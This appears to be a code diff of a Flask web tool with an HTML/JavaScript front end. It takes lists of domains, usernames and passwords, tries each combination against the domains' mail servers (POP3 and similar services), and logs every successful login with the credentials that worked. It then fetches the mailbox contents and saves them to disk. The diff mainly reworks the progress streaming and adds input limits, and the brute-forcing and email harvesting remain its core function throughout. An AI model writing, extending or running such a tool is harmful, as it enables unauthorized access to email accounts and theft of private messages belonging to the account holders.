+        <input type="checkbox" name="pop3_full" value="yes"> POP3 full messages<br>
+        <input type="checkbox" name="no_ssl_verify" value="yes"> Disable SSL verify<br>
+        <input type="checkbox" name="fetch_emails" value="yes" checked> Fetch emails<br>
 
         <button type="submit">[ SCAN ]</button>
     </form>
 
-    <div id="progress" class="hidden">
-        <h2>📡 PROGRESS (last 200 lines)</h2>
-        <pre id="log"></pre>
-    </div>
-
-    <div id="successes" class="hidden">
-        <h2>✅ SUCCESSES</h2>
-        <pre id="success-log"></pre>
-    </div>
-
-    <div id="results" class="hidden">
-        <h2>📋 RESULTS</h2>
-        <div id="results-content"></div>
-    </div>
+    <div id="progress" class="hidden"><h2>PROGRESS</h2><pre id="log"></pre></div>
+    <div id="successes" class="hidden"><h2>SUCCESSES</h2><pre id="success-log"></pre></div>
+    <div id="debug">Waiting for progress...</div>
 
     <script>
-        // Limit progress log to 200 lines
-        const MAX_LOG_LINES = 200;
+        const MAX_LOG = 200;
         let logLines = [];
-
-        function addLogLine(line) {
+        function addLog(line) {
             logLines.push(line);
-            if (logLines.length > MAX_LOG_LINES) {
-                logLines.shift();
-            }
+            if(logLines.length > MAX_LOG) logLines.shift();
             document.getElementById('log').textContent = logLines.join('\\n');
+            document.getElementById('debug').textContent = 'Last event: ' + line.substring(0, 50) + '...';
         }
 
-        document.getElementById('scanForm').addEventListener('submit', async (e) => {
+        document.getElementById('scanForm').addEventListener('submit', async (e)=>{
             e.preventDefault();
             const form = e.target;
             const formData = new FormData(form);
-
-            const progressDiv = document.getElementById('progress');
-            const successesDiv = document.getElementById('successes');
-            const logPre = document.getElementById('log');
-            const successPre = document.getElementById('success-log');
-            const resultsDiv = document.getElementById('results');
-            const resultsContent = document.getElementById('results-content');
-            progressDiv.classList.remove('hidden');
-            successesDiv.classList.remove('hidden');
-            resultsDiv.classList.add('hidden');
-            logPre.textContent = '';
-            successPre.textContent = '';
+            document.getElementById('progress').classList.remove('hidden');
+            document.getElementById('successes').classList.remove('hidden');
+            document.getElementById('log').textContent = '';
+            document.getElementById('success-log').textContent = '';
+            document.getElementById('debug').textContent = 'Connecting...';
             logLines = [];
 
-            try {
-                const response = await fetch('/scan/stream', {
-                    method: 'POST',
-                    body: formData
-                });
+            // Set a timeout to show if no events received
+            let noEventTimeout = setTimeout(() => {
+                addLog('[DEBUG] No events received in 3 seconds. Check console (F12).');
+            }, 3000);
 
+            try {
+                const response = await fetch('/scan', { method:'POST', body:formData });
                 const reader = response.body.getReader();
                 const decoder = new TextDecoder();
                 let buffer = '';
-                let domainResults = [];
-
-                while (true) {
-                    const { done, value } = await reader.read();
-                    if (done) break;
-                    buffer += decoder.decode(value, { stream: true });
-                    const lines = buffer.split('\\n');
-                    buffer = lines.pop();
-
-                    for (const line of lines) {
-                        if (line.trim() === '') continue;
+                while(true) {
+                    const {done, value} = await reader.read();
+                    if(done) break;
+                    buffer += decoder.decode(value, {stream:true});
+                    const events = buffer.split('\\n\\n');
+                    buffer = events.pop();
+                    for(const event of events) {
+                        if(!event.trim()) continue;
+                        // Log raw event to console for debugging
+                        console.log('RAW EVENT:', event);
+                        const lines = event.split('\\n');
+                        const ev = lines[0].replace('event: ','');
+                        const dataStr = lines[1].replace('data: ','');
                         try {
-                            const msg = JSON.parse(line);
-                            handleMessage(msg, logPre, successPre, domainResults, resultsContent, resultsDiv);
-                        } catch (err) {
-                            addLogLine(`[CLIENT ERROR] Failed to parse: ${line}`);
+                            const data = JSON.parse(dataStr);
+                            // Clear the no-event timeout on first event
+                            clearTimeout(noEventTimeout);
+                            handleEvent(ev, data);
+                        } catch (parseErr) {
+                            console.error('Failed to parse event data:', dataStr, parseErr);
+                            addLog(`[PARSE ERROR] Could not parse: ${dataStr.substring(0,50)}...`);
                         }
                     }
                 }
-            } catch (err) {
-                addLogLine(`[NETWORK ERROR] ${err.message}`);
+            } catch(err) {
+                addLog(`[NETWORK ERROR] ${err.message}`);
+                console.error(err);
             }
         });
 
-        function handleMessage(msg, logPre, successPre, domainResults, resultsContent, resultsDiv) {
-            if (msg.type === 'start') {
-                addLogLine(`[INFO] Starting scan of ${msg.total} domains...`);
-            } else if (msg.type === 'domain_start') {
-                addLogLine(`\\n[INFO] Scanning ${msg.domain}...`);
-            } else if (msg.type === 'attempt') {
-                addLogLine(`[${msg.domain} ${msg.service}] testing credential ${msg.current}/${msg.total}`);
-            } else if (msg.type === 'success') {
-                // Add to progress log
-                let line = `[SUCCESS] ${msg.domain}: ${msg.service} - ${msg.credentials} - msgs: ${msg.msg_count}`;
-                if (msg.size_mb) line += ` (${msg.size_mb} MB)`;
-                line += ` (fetched ${msg.fetched})`;
-                addLogLine(line);
-
-                // Also append to successes div with saved location
-                let successLine = `${msg.domain} | ${msg.service} | ${msg.credentials} | msgs: ${msg.msg_count} | saved to: ${msg.saved_to}`;
-                successPre.textContent += successLine + '\\n';
-            } else if (msg.type === 'heartbeat') {
-                // optionally ignore
-            } else if (msg.type === 'domain_done') {
-                domainResults.push(msg.result);
-            } else if (msg.type === 'error') {
-                addLogLine(`\\n[ERROR] ${msg.message}`);
-            } else if (msg.type === 'all_done') {
-                addLogLine('\\n[INFO] Scan complete. Rendering results...');
-                renderResults(domainResults, resultsContent);
-                resultsDiv.classList.remove('hidden');
+        function handleEvent(ev, data) {
+            if(ev==='start') addLog(`[INFO] Scanning ${data.total} domains...`);
+            else if(ev==='test') addLog(`[DEBUG] ${data.message}`);
+            else if(ev==='domain_start') addLog(`\\n[INFO] Scanning ${data.domain} (services: ${data.services.join(', ')})`);
+            else if(ev==='attempt') addLog(`[${data.domain} ${data.service}] attempt ${data.current}/${data.total}`);
+            else if(ev==='success') {
+                addLog(`[SUCCESS] ${data.domain} ${data.service} - ${data.credentials} msgs:${data.msg_count} fetched:${data.fetched}`);
+                document.getElementById('success-log').textContent += `${data.domain} | ${data.service} | ${data.credentials} | saved: ${data.saved_to}\\n`;
             }
-        }
-
-        function renderResults(domainResults, container) {
-            let html = '';
-            for (const dr of domainResults) {
-                html += `<div class="result-domain"><h3>🔍 ${dr.domain}</h3>`;
-                for (const svc of dr.services) {
-                    if (!svc.success) continue;
-                    html += `<div style="margin-left:20px; margin-bottom:15px;">`;
-                    html += `<strong>${svc.service}:${svc.port} (${svc.encryption})</strong><br>`;
-                    html += `Credentials: ${svc.credentials_used}<br>`;
-                    if (svc.mailboxes && svc.mailboxes.length) {
-                        html += `Mailboxes: ${svc.mailboxes.join(', ')}<br>`;
-                    }
-                    html += `Message count: ${svc.message_count} (fetched: ${svc.fetched})<br>`;
-                    if (svc.total_size) {
-                        html += `Total size: ${(svc.total_size / 1024).toFixed(2)} KB<br>`;
-                    }
-                    // Show a few snippets (max 5) to keep UI light
-                    if (svc.messages && svc.messages.length) {
-                        html += `<details><summary>📨 message snippets (${svc.messages.length})</summary>`;
-                        html += `<pre style="background:#222; padding:5px; max-height:200px; overflow-y:auto;">`;
-                        const limited = svc.messages.slice(0,5);
-                        for (const m of limited) {
-                            html += escapeHtml(m) + '\\n\\n';
-                        }
-                        if (svc.messages.length > 5) html += '... (more saved to disk)\\n';
-                        html += `</pre></details>`;
-                    }
-                    html += `</div>`;
-                }
-                html += `</div><hr>`;
-            }
-            container.innerHTML = html;
-        }
-
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
+            else if(ev==='heartbeat') { /* ignore */ }
+            else if(ev==='done') addLog('\\n[INFO] Scan complete.');
         }
     </script>
 </body>
 </html>
 """
 
-# ---------- Flask Routes ----------
+# -------------------- Flask Routes --------------------
 @app.route('/')
+@require_auth
 def index():
     return render_template_string(INDEX_HTML)
 
-@app.route('/scan/stream', methods=['POST'])
-def scan_stream():
-    """Streaming endpoint with progress updates."""
-    # Extract all request data HERE (inside request context)
+@app.route('/scan', methods=['POST'])
+@require_auth
+def scan():
+    logging.info("Received /scan request")
+    domains = []
     domains_text = request.form.get('domains', '').strip()
-    if not domains_text:
+    if domains_text:
+        domains.extend([line.strip() for line in domains_text.splitlines() if line.strip()])
+
+    domains_file = request.files.get('domains_file')
+    if domains_file and domains_file.filename:
+        try:
+            content = domains_file.read().decode('utf-8')
+            domains.extend([line.strip() for line in content.splitlines() if line.strip()])
+        except Exception as e:
+            logging.error(f"Error reading domains file: {e}")
+            return jsonify({"error": f"Error reading domains file: {e}"}), 400
+
+    if not domains:
         return jsonify({"error": "No domains provided"}), 400
-    domains = [line.strip() for line in domains_text.splitlines() if line.strip()]
+    if len(domains) > MAX_DOMAINS:
+        return jsonify({"error": f"Too many domains (max {MAX_DOMAINS})"}), 400
 
     user_file = request.files.get('userfile')
-    pass_file = request.files.get('passfile')
-    if not user_file or not pass_file:
-        return jsonify({"error": "Username and password files are required"}), 400
-
+    if not user_file:
+        return jsonify({"error": "Usernames file required"}), 400
     try:
         usernames = [line.decode('utf-8').strip() for line in user_file.stream.read().splitlines() if line.strip()]
+    except Exception as e:
+        return jsonify({"error": f"Error reading usernames: {e}"}), 400
+    if len(usernames) > MAX_USERNAMES:
+        return jsonify({"error": f"Too many usernames (max {MAX_USERNAMES})"}), 400
+
+    pass_file = request.files.get('passfile')
+    if not pass_file:
+        return jsonify({"error": "Passwords file required"}), 400
+    try:
         passwords = [line.decode('utf-8').strip() for line in pass_file.stream.read().splitlines() if line.strip()]
     except Exception as e:
-        return jsonify({"error": f"Error reading files: {e}"}), 400
-
-    creds = [(u, p) for u in usernames for p in passwords]
+        return jsonify({"error": f"Error reading passwords: {e}"}), 400
+    if len(passwords) > MAX_PASSWORDS:
+        return jsonify({"error": f"Too many passwords (max {MAX_PASSWORDS})"}), 400
 
     timeout = int(request.form.get('timeout', DEFAULT_TIMEOUT))
     max_msgs = int(request.form.get('max_msgs', DEFAULT_MAX_MSGS))
@@ -718,15 +647,16 @@ def scan_stream():
     no_ssl_verify = 'no_ssl_verify' in request.form
     fetch_emails = 'fetch_emails' in request.form
 
-    # Ensure base output directory exists
-    os.makedirs(SCAN_OUTPUT, exist_ok=True)
+    max_msgs = min(max_msgs, MAX_FETCH_MSGS)
+    threads = min(threads, MAX_THREADS)
 
-    # Return a streaming response using the inner generator
-    return Response(
-        generate_progress(domains, creds, timeout, max_msgs, no_ssl_verify,
-                          fetch_all, pop3_full, fetch_emails, threads),
-        mimetype='application/x-ndjson'
-    )
+    logging.info(f"Creating scanner with {len(domains)} domains, {len(usernames)} users, {len(passwords)} passwords")
+    scanner = Scanner(domains, usernames, passwords, timeout, max_msgs, threads,
+                      fetch_all, pop3_full, no_ssl_verify, fetch_emails)
+
+    return Response(event_stream(scanner), mimetype='text/event-stream')
 
 if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    SCAN_OUTPUT.mkdir(exist_ok=True)
+    # Run with debug=True to see detailed logs (but disable in production)
+    app.run(host='0.0.0.0', port=5000, threaded=True, debug=True)
